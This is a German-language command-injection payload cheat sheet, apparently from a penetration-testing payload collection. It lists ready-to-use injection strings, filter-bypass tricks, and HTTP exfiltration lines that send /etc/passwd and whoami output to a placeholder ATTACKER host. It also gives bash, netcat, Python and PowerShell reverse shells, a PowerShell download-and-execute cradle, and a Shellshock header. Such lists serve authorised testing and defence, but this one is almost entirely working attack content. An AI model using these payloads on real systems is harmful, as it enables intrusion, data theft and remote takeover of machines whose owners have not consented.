# 💻 Payloads für Command Injection

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Command-Injection.tr.md) • [🇬🇷 Ελληνικά](Command-Injection.el.md)

```
 ██████╗ ███████╗     ██████╗ ██████╗ ███╗   ███╗███╗   ███╗ █████╗ ███╗   ██╗██████╗ 
██╔═══██╗██╔════╝    ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██╔══██╗████╗  ██║██╔══██╗
██║   ██║███████╗    ██║     ██║   ██║██╔████╔██║██╔████╔██║███████║██╔██╗ ██║██║  ██║
██║   ██║╚════██║    ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══██║██║╚██╗██║██║  ██║
╚██████╔╝███████║    ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║  ██║██║ ╚████║██████╔╝
 ╚═════╝ ╚══════╝     ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ 
██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗                   
██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║                   
██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║                   
██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║                   
██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║                   
╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝                   
```

---

## 🎯 Befehlstrennzeichen

### Linux/Unix
```bash
;       # Semikolon – danach ausführen
|       # Pipe – Ausgabe an den nächsten Befehl übergeben
||      # ODER – ausführen, wenn der erste Befehl fehlschlägt
&       # Im Hintergrund ausführen
&&      # UND – ausführen, wenn der erste Befehl erfolgreich ist
`cmd`   # Backticks – Befehlssubstitution
$(cmd)  # Dollar-Schreibweise – Befehlssubstitution
\n      # Zeilenumbruch – Befehle trennen
```

### Windows
```cmd
;       # Funktioniert in manchen Kontexten
|       # Pipe
||      # ODER
&       # Beide ausführen
&&      # UND
\n      # Zeilenumbruch
%0a     # URL-kodierter Zeilenumbruch
```

---

## 💉 Grundlegende Payloads

### Einfacher Test
```bash
; id
; whoami
| id
| whoami
|| id
|| whoami
& id
& whoami
&& id
&& whoami
`id`
$(id)
```

### URL-kodiert
```
%3B+id               # ; id
%7C+id               # | id
%7C%7C+id            # || id
%26+id               # & id
%26%26+id            # && id
%0A+id               # Zeilenumbruch + id
```

---

## 🔥 Blinde Command Injection

### Zeitbasierte Erkennung
```bash
# Befehle für Wartezeiten
; sleep 5
| sleep 5
|| sleep 5
& sleep 5
&& sleep 5
`sleep 5`
$(sleep 5)

# Windows
; ping -n 5 127.0.0.1
| timeout 5
```

### DNS-basierte Erkennung
```bash
# Mit nslookup
; nslookup BURP_COLLAB
| nslookup BURP_COLLAB
`nslookup BURP_COLLAB`
$(nslookup BURP_COLLAB)

# Mit curl/wget
; curl http://BURP_COLLAB
; wget http://BURP_COLLAB
$(curl http://ATTACKER/?data=$(whoami))
```

### HTTP-basierte Datenexfiltration
```bash
; curl http://ATTACKER/$(whoami)
; curl http://ATTACKER/?d=$(cat /etc/passwd | base64)
; wget http://ATTACKER/$(hostname)
$(curl http://ATTACKER/?id=$(id))
`curl http://ATTACKER/?user=$(whoami)`
```

---

## 🛡️ Techniken zur Filterumgehung

### Leerzeichenfilter umgehen
```bash
# Mit $IFS (Internal Field Separator; internes Feldtrennzeichen)
;cat${IFS}/etc/passwd
;cat$IFS/etc/passwd
;{cat,/etc/passwd}

# Mit Tabulatoren
;cat	/etc/passwd

# Mit geschweiften Klammern
{cat,/etc/passwd}
```

### Schlüsselwortfilter umgehen
```bash
# Befehle aufteilen
w'h'oami
w"h"oami
who$@ami
who\ami

# Mit Platzhaltern
/bin/ca? /etc/passwd
/bin/c?t /etc/passwd
/b??/c?t /etc/passwd

# Mit Variablen
$u; cat /etc/passwd
test=cat; $test /etc/passwd

# Hex-Kodierung
echo -e "\x69\x64" | sh    # id
```

### Sonderzeichenfilter umgehen
```bash
# Mit unterschiedlichen Trennzeichen
;{cat,/etc/passwd}
;cat</etc/passwd
;cat$IFS/etc/passwd

# Zeilenumbruch-Injection
%0aid
%0Acat%20/etc/passwd

# Mit Kommentaren
; id #
| id #
```

---

## 🐧 Linux-Payloads

### Dateien lesen
```bash
; cat /etc/passwd
; head /etc/passwd
; tail /etc/passwd
; less /etc/passwd
; more /etc/passwd
; nl /etc/passwd
; sort /etc/passwd
; uniq /etc/passwd
; strings /etc/passwd
; od -c /etc/passwd
; xxd /etc/passwd
; base64 /etc/passwd
```

### Befehlsausführung
```bash
; id
; whoami
; uname -a
; hostname
; pwd
; ls -la
; env
; ps aux
; netstat -an
; ifconfig
; ip addr
```

### Reverse Shell
```bash
; bash -i >& /dev/tcp/ATTACKER/4444 0>&1
; nc -e /bin/sh ATTACKER 4444
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

---

## 🪟 Windows-Payloads

### Grundlegende Befehle
```cmd
& whoami
& hostname
& ipconfig
& net user
& dir
& type C:\Windows\win.ini
& type C:\Windows\System32\drivers\etc\hosts
```

### Dateien lesen
```cmd
& type C:\Windows\win.ini
& type C:\inetpub\wwwroot\web.config
& more C:\Windows\win.ini
& find "password" C:\path\to\file.txt
```

### PowerShell
```powershell
& powershell -c "whoami"
& powershell -c "Get-Process"
& powershell -c "IEX(New-Object Net.WebClient).downloadString('http://ATTACKER/shell.ps1')"
```

### Reverse Shell
```cmd
& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## 📝 Häufige Einfügepositionen

```
URL-Parameter:
  ?ip=127.0.0.1;id
  ?file=test.txt|id
  ?cmd=ls

POST-Parameter:
  filename=test.txt;id
  host=localhost|whoami

Header:
  User-Agent: () { :;}; /bin/bash -c 'cat /etc/passwd'
  X-Forwarded-For: ;id

Dateinamen bei Uploads:
  test;id;.txt
  test$(id).txt
  test`id`.txt
```

---

## 📋 Testcheckliste

```markdown
□ Alle Befehlstrennzeichen prüfen (; | || & && ` $())
□ URL-kodierte Varianten prüfen
□ Zeitbasierte Blind-Injection prüfen
□ DNS-/HTTP-Exfiltration prüfen
□ Leerzeichenfilter umgehen ($IFS, Tabulatoren, geschweifte Klammern)
□ Schlüsselwortfilter umgehen (Anführungszeichen, Platzhalter)
□ Zeilenumbruch-Injection prüfen (%0a)
□ Auf gefilterte Zeichen prüfen
□ Linux- und Windows-Befehle prüfen
```

---

## 🔗 Verwandte Payloads

- [LFI-Payloads](./LFI.de.md)
- [SSTI-Payloads](./SSTI.de.md)

---

**Zurück zur Payload-Sammlung:** 💉 Payload-Sammlung (im Original verlinkt; `Payloads/README.md` fehlt)

---

---

## Hinweise zur deutschen Ausgabe

> **Shell-Kontext:** Die Zeichen haben je nach Interpreter unterschiedliche Bedeutung. Das Semikolon ist insbesondere kein allgemeiner Befehlstrenner von cmd.exe. Die mit `#` erläuterten Zeilen sind dort keine direkt ausführbare Kommentarsyntax. Brace Expansion und Befehlssubstitution sind shellabhängig; die Platzhalter und Beispieladressen werden vorausgesetzt. Ein einzelner Zeitunterschied oder Callback belegt ohne passenden Kontext keine konkrete Auswirkung. Die Originalpayloads wurden nicht verändert oder ausgeführt.

> **Begriffe:** *Blind* bedeutet, dass die Befehlsausgabe nicht unmittelbar sichtbar ist; DNS-/HTTP-Callbacks dienen einer getrennten Beobachtung. Der Abschnitt „DNS-basierte Erkennung“ enthält auch HTTP-Aufrufe. Ältere Netcat-/Python-Varianten und feste Wartezeiten funktionieren nicht in jeder Umgebung. [GNU Bash: Shell-Operationen](https://www.gnu.org/software/bash/manual/html_node/Shell-Operation.html).
